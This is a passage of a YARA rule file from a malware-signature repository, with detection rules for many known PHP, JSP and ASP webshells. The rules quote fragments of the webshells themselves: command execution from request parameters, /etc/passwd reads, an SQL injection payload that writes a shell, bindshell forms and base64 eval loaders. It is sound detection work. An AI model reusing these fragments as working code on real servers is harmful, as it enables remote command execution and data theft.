		hash = "db076b7c80d2a5279cab2578aa19cb18aea92832"
		logic_hash = "6840af0d9f99277277edce93deb54e9a319c8938169701c89fdeb65207590951"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
		$s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
		$s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
		$s15 = "if(empty($_GET['file'])){" fullword
		$s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b647f529-be81-51ad-b671-84aec410e133"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5844-L5860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
		logic_hash = "92bfac3516a448bbb3e78cf8950c6e816bf35d0ae2f3d32bc9b9b2836309999b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
		$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
		$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
		$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
		$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_PHP_Backdoor_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "65e1305b-4fc7-5885-b3df-92846bb57fe3"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_php_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5861-L5877"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
		logic_hash = "4228bcbfff5d7756615347196270f7916843e2aceacc7298610070b8b923381b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
		$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
		$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
		$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
		$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Worse_Linux_Shell_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file Worse Linux Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "04ed7464-29d1-54b9-98ff-afc03475b220"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Worse_Linux_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5878-L5895"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64623ab1246bc8f7d256b25f244eb2b41f543e96"
		logic_hash = "6480c524213583511253ea1d37820994bba8a86f58a3775d4a9e4325725289d8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
		$s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
		$s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
		$s8 = "$currentCMD = \"ls -la\";" fullword
		$s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
		$s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Phpinj_1
{
	meta:
		description = "PHP Webshells Github Archive - file pHpINJ.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5896-L5913"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
		logic_hash = "271efaa8f370376f971d3d59256658b341599ac554cc216e09401e44b16bdede"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
		$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
		$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
		$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
		$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
		$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
		$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_NGH_1
{
	meta:
		description = "PHP Webshells Github Archive - file NGH.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5914-L5931"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
		logic_hash = "572b026545b012951136bdb9b1101e38f27bc3321b895799bc853ea1190877f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
		$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
		$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
		$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
		$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
		$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
		$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Matamu_1
{
	meta:
		description = "PHP Webshells Github Archive - file matamu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5932-L5948"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
		logic_hash = "c0101dab5fe7c3a2652b2e23e1ef0274364137895a402a0367c6b5474c0e8a1f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "$command .= ' -F';" fullword
		$s3 = "/* We try and match a cd command. */" fullword
		$s4 = "directory... Trust me - it works :-) */" fullword
		$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
		$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
		$s16 = "/* The last / in work_dir were the first charecter." fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ru24_Post_Sh_1
{
	meta:
		description = "PHP Webshells Github Archive - file ru24_post_sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "86a45d72-c42d-58d5-9969-d3ebfc22853d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5949-L5964"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d2c18766a1cd4dda928c12ff7b519578ccec0769"
		logic_hash = "6cf15a67c311979d32edfb443701cef34ee32d7a672314fc7b60b262b6b2c402"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "http://www.ru24-team.net" fullword
		$s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s6 = "Ru24PostWebShell"
		$s7 = "Writed by DreAmeRz" fullword
		$s9 = "$function=passthru; // system, exec, cmd" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Hiddens_Shell_V1_1
{
	meta:
		description = "PHP Webshells Github Archive - file hiddens shell v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7194998e-c84c-5f59-92fe-857ecf7e8e88"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5965-L5976"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"
		logic_hash = "b76400c320e6294b0c831fbbb8e08a9d2097fbb027065f9c4b496d4b005ba016"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99_Madnet_1
{
	meta:
		description = "PHP Webshells Github Archive - file c99_madnet.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f2b9c3d1-1c55-59cb-a9bf-8b4011f86a3b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5977-L5992"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
		logic_hash = "cd4048f28405f106302643656ae5f8a257aaec0184a8057a9dffbda9bb857027"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"pass\";  //Pass" fullword
		$s3 = "$login = \"user\"; //Login" fullword
		$s4 = "             //Authentication" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99_Locus7S_1
{
	meta:
		description = "PHP Webshells Github Archive - file c99_locus7s.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f92fe5a2-e465-56ed-a77b-b32ea4c2c105"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L5993-L6008"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d413d4700daed07561c9f95e1468fb80238fbf3c"
		logic_hash = "5ecfc5f6da471bd3037228c0bc762d50762933af3cf6674210c7b2017a45a646"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
		$s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
		$s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
		$s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
		$s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "dfd8c88d-4fe2-5786-9d71-65dba525c358"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6009-L6025"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
		logic_hash = "13e696c1c671d7fda832c84f150e3f41ed55bf888c4bebfeb06ea68d6be65527"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s1 = "String password=request.getParameter(\"password\");" fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
		$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
		$s12 = "password = (String)session.getAttribute(\"password\");" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Safe0Ver_1
{
	meta:
		description = "PHP Webshells Github Archive - file safe0ver.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a7fc8c89-f7a1-5958-823a-763dedb3066d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6026-L6043"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "366639526d92bd38ff7218b8539ac0f154190eb8"
		logic_hash = "ae5de63b79804cf8c99bc5ea0c8862cf05e4085451d2b516cf95565bf32f3876"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
		$s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
		$s5 = "else { /* <!-- Then it must be a File... --> */" fullword
		$s7 = "$contents .= htmlentities( $line ) ;" fullword
		$s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
		$s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s20 = "/* <!-- End of Actions --> */" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Uploader_1
{
	meta:
		description = "PHP Webshells Github Archive - file Uploader.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c68e15d9-865e-5269-a91c-00619fe76305"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6044-L6055"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
		logic_hash = "c4b915f60a952131caa2c4f5bb2eea85ef25f27cabb8ad36a6bb928433558954"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Kral_1
{
	meta:
		description = "PHP Webshells Github Archive - file kral.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6056-L6072"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
		logic_hash = "0aded226f4e54c0169b9fbda91458f581ea47f9f8bda61a350b5e6f8b60931f3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$adres=gethostbyname($ip);" fullword
		$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
		$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
		$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
		$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
		$s20 = "<p><strong>Server listeleyici</strong><br />" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Simple_Backdoor_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file simple-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "faddd38e-d0c6-5299-9983-53351af1ece5"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_simple_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6088-L6108"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "edcd5157a68fa00723a506ca86d6cbb8884ef512"
		logic_hash = "655e445e51ec0f1bdce006a72acf3bce95941a349c279c14768760fa9f6f9d76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s3 = "        echo \"</pre>\";" fullword
		$s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
		$s5 = "        echo \"<pre>\";" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s7 = "        die;" fullword
		$s8 = "        system($cmd);" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_2_1
{
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a504442f-85f2-55a1-8a07-1e0faccf8bc0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6109-L6123"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
		logic_hash = "fbe1f77e00fbc4e58cbad564e2d96c0381765ac799dfdf6cc2580428c68f97a5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
		$s4 = "$v = @ini_get(\"open_basedir\");" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ntdaddy_V1_9_1
{
	meta:
		description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a175fd28-5dc2-5827-87f0-4117e889e90e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6124-L6138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
		logic_hash = "fdf8b4bb4980e588ad5ccee2d047660980d39f38617f887c5762dcdb0b858267"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
		$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s13 = "<form action=ntdaddy.asp method=post>" fullword
		$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Lamashell_1
{
	meta:
		description = "PHP Webshells Github Archive - file lamashell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "60e39eed-baa2-5999-8560-0a0242ce2608"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6139-L6155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b71181e0d899b2b07bc55aebb27da6706ea1b560"
		logic_hash = "e58dbd6b9c65a139828890a3fadfad9031580fe189066489d266d37d7078ad98"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
		$s8 = "$curcmd = $_POST['king'];" fullword
		$s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
		$s18 = "<title>lama's'hell v. 3.0</title>" fullword
		$s19 = "_|_  O    _    O  _|_"
		$s20 = "$curcmd = \"ls -lah\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Simple_PHP_Backdoor_By_DK_1
{
	meta:
		description = "PHP Webshells Github Archive - file Simple_PHP_backdoor_by_DK.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2c424714-1d2c-5b89-b1bc-a201e37a0a5d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6156-L6171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "03f6215548ed370bec0332199be7c4f68105274e"
		logic_hash = "1f65f759ec4045c521085aad84d0aea4dcfcf26eac4357751cf1dde6886d1718"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s8 = "system($cmd);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Moroccan_Spamers_Ma_Edition_By_Ghost_1
{
	meta:
		description = "PHP Webshells Github Archive - file Moroccan Spamers Ma-EditioN By GhOsT.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fa9ce70-d300-55fe-bf98-636f026317ec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6172-L6185"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "31e5473920a2cc445d246bc5820037d8fe383201"
		logic_hash = "0e3d2d97665b8849d121d63a22baf7393047a814dde3753e395418c1868b59be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$content = chunk_split(base64_encode($content)); " fullword
		$s12 = "print \"Sending mail to $to....... \"; " fullword
		$s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99Madshell_V__2_0_Madnet_Edition_1
{
	meta:
		description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
		author = "Florian Roth (Nextron Systems)"
		id = "51db0495-14f3-527e-865b-1405db57ff27"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6186-L6201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
		logic_hash = "7cf825a604783ebc74b1dca53aaff5c886957c562e11276f2acce5ff1f6ab991"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"\";  //Pass" fullword
		$s3 = "$login = \"\"; //Login" fullword
		$s4 = "//Authentication" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Cmdasp_Asp_Php_1
{
	meta:
		description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "184b1731-31a9-5040-aa25-d145e8064758"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6202-L6221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
		logic_hash = "0fd9c7e83ad9ddf5cf88f1d1573324d9f24ae03a1951446fe11c116fd0cf4932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
		$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
		$s6 = "' --------------------o0o--------------------" fullword
		$s8 = "' File: CmdAsp.asp" fullword
		$s11 = "<-- CmdAsp.asp -->" fullword
		$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
